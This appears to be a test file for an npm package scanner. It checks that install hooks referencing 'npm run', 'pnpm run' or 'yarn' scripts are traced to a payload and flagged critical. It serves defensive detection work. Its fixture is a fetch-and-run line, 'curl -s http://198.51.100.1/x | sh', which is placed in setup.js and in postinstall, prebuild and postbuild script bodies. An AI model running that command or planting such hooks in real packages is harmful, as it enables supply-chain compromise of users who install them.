import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// A lifecycle hook that runs `npm run <name>` is followed into `scripts[<name>]`.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address
const PAYLOAD = `${CURL_SH}\n`;

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, pkgJson: object): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  list.push(file("package/package.json", JSON.stringify(pkgJson)));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
const sev = (files: Record<string, string>, scripts: Record<string, string>) =>
  runRules(inputFor(files, { scripts })).filter((x) => x.ruleId === "install-scripts").map((x) => x.severity);

describe("install hooks follow package-manager script references", () => {
  const files = { "package/setup.js": PAYLOAD };
  for (const hook of ["npm run setup", "pnpm run setup", "yarn run setup", "yarn setup", "npm run-script setup", "npm run setup -- --flag", "npm run --silent setup"]) {
    test(`\`${hook}\` reaches the payload in setup.js`, () => {
      assert.deepEqual(sev(files, { postinstall: hook, setup: "node setup.js" }), ["critical"]);
    });
  }

  test("a reference inside a compound command is followed", () => {
    assert.deepEqual(sev(files, { postinstall: "echo hi && npm run setup", setup: "node setup.js" }), ["critical"]);
  });

  test("`npm run build` with a benign build script stays clean", () => {
    assert.deepEqual(sev({ "package/build.js": "console.log(1)\n", "package/setup.js": PAYLOAD }, { postinstall: "npm run build", build: "node build.js" }), ["low"]);
  });

  test("an undefined script name resolves nothing", () => {
    assert.deepEqual(sev(files, { postinstall: "npm run setup" }), ["low"]);
  });

  test("`yarn install` is a builtin, not a script, unless one is defined", () => {
    const f = { "package/setup.js": PAYLOAD };
    assert.deepEqual(sev(f, { postinstall: "yarn install" }), ["low"]);
    // `install` itself is critical; `postinstall` is too only because `yarn install` now names a defined script.
    assert.deepEqual(sev(f, { postinstall: "yarn install", install: "node setup.js" }), ["critical", "critical"]);
  });

  test("`pnpm <name>` is not followed (only `pnpm run`)", () => {
    assert.deepEqual(sev(files, { postinstall: "pnpm setup", setup: "node setup.js" }), ["low"]);
  });

  test("a self-referencing script terminates", () => {
    assert.deepEqual(sev(files, { postinstall: "npm run a", a: "npm run a" }), ["low"]);
    assert.deepEqual(sev(files, { postinstall: "npm run a", a: "npm run b", b: "npm run a && node setup.js" }), ["critical"]);
  });

  test("chained scripts resolve within the depth limit, and a very long chain is bounded", () => {
    assert.deepEqual(sev(files, { postinstall: "npm run a", a: "npm run b", b: "node setup.js" }), ["critical"]);
    const scripts: Record<string, string> = { postinstall: "npm run s0" };
    for (let i = 0; i < 20000; i++) scripts[`s${i}`] = `npm run s${i + 1}`;
    scripts.s20000 = "node setup.js";
    assert.deepEqual(sev(files, scripts), ["low"]); // beyond the hop bound: no crash, no resolution
  });

  test("an inline payload in the followed script body is critical, and the evidence names the script", () => {
    const findings = runRules(inputFor({}, { scripts: { postinstall: "npm run setup", setup: CURL_SH } }))
      .filter((x) => x.ruleId === "install-scripts");
    assert.deepEqual(findings.map((x) => x.severity), ["critical"]);
    assert.ok(findings[0]!.evidence.some((e) => e.snippet.startsWith('"setup":')));
    for (const hook of ["pnpm run setup", "yarn run setup", "yarn setup", "npm run-script setup"]) {
      assert.deepEqual(sev({}, { postinstall: hook, setup: CURL_SH }), ["critical"]);
    }
    // chained, and bounded like the file case
    assert.deepEqual(sev({}, { postinstall: "npm run a", a: "npm run b", b: CURL_SH }), ["critical"]);
  });

  test("a payload in `prebuild` / `postbuild` reached through `npm run build` is critical", () => {
    assert.deepEqual(sev({}, { postinstall: "npm run build", build: "tsc", prebuild: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({}, { postinstall: "pnpm run build", build: "tsc", postbuild: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({}, { postinstall: "yarn build", build: "tsc", prebuild: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({}, { postinstall: "yarn build", prebuild: CURL_SH }), ["low"]); // bare yarn needs `build` defined
    assert.deepEqual(sev(files, { postinstall: "npm run build", build: "tsc", prebuild: "node setup.js" }), ["critical"]);
    // pre/post of an undefined main script still run
    assert.deepEqual(sev({}, { postinstall: "npm run build", prebuild: CURL_SH }), ["critical"]);
  });

  test("a benign `prebuild` stays clean; `pre<name>` is not run for an unrelated name", () => {
    assert.deepEqual(sev({ "package/clean.js": "console.log(1)\n" }, { postinstall: "npm run build", build: "tsc", prebuild: "node clean.js" }), ["low"]);
    assert.deepEqual(sev({}, { postinstall: "npm run build", build: "tsc", preother: CURL_SH }), ["low"]);
  });

  test("inherited object keys are not scripts", () => {
    assert.deepEqual(sev(files, { postinstall: "npm run constructor" }), ["low"]);
    assert.deepEqual(sev(files, { postinstall: "yarn toString" }), ["low"]);
  });
});
